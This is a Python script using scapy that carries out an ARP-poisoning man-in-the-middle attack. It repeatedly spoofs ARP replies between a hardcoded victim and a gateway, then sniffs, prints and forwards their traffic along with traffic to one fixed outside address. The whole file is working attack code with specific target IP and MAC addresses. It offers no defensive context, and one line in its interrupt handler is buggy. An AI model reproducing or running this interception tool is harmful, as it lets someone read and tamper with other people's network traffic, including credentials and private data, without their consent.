from scapy.all import *
import multiprocessing
import time
import os
import sys

class MITM:
  packets=[]
  # def __init__(self,victim=("192.168.43.205","2c:f0:a2:5c:f7:30" ),node2=("192.168.43.1", "c0:ee:fb:d0:73:7a")):
  def __init__(self,victim=("101.5.123.201","74:23:44:ea:57:a7" ),node2=("101.5.112.1", "14:14:4b:6b:2a:59")):
    self.victim=victim
    self.node2=node2
    multiprocessing.Process(target=self.arp_poison).start()
    try:
      sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s)) or (src 166.111.204.120) or (dst 166.111.204.120)'%(self.node2[0], self.victim[0],self.victim[0],self.node2[0]),prn=lambda x:self.routep(x))
    except KeyboardInterrupt as e:
      wireshark(packets)
  def routep(self,packet):
    if packet.haslayer(IP):
      packet.show()
      if packet[IP].dst==self.victim[0]:
        packet[Ether].src=packet[Ether].dst
        packet[Ether].dst=self.victim[1]
      elif packet[IP].dst==self.node2[0]:
        packet[Ether].src=packet[Ether].dst
        packet[Ether].dst=self.node2[1]
      self.packets.append(packet)
      packet.display()
      send(packet)
      # packet.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")
  def arp_poison(self):
    a=ARP()
    a.psrc=self.victim[0]
    a.pdst=self.node2[0]
    b=ARP()
    b.psrc=self.node2[0]
    b.pdst=self.victim[0]
    a.show()
    cond=True
    while cond:
      send(b)
      send(a)
      time.sleep(5)
      #cond=False

if __name__=="__main__":
  mitm=MITM()